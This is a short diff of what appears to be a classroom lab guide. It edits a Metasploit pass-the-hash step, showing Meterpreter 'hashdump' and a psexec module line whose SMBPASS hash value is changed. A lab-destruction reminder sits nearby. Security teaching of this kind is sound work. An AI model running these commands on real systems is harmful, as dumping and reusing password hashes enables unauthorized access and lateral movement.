@@ -183,7 +183,7 @@ meterpreter > `hashdump`
 meterpreter > `exit -y`
 
 
-msf6 exploit(windows/smb/psexec) > `set SMBPASS aad3b435b51404eeaad3b435b51404ee:30ee6993157208a29fb730af8bcc3dfe`
+msf6 exploit(windows/smb/psexec) > `set SMBPASS aad3b435b51404eeaad3b435b51404ee:d4a1be1776ad10df103812b1a923cde4`
 
 msf6 exploit(windows/smb/psexec) > `exploit`
 
@@ -226,6 +226,7 @@ Please be sure to destroy the lab environment!
 [Click here for instructions on how to destroy the Lab Environment](/IntroClassFiles/Tools/IntroClass/LabDestruction/labdestruction.md)
 
 ---
+
 
 
 
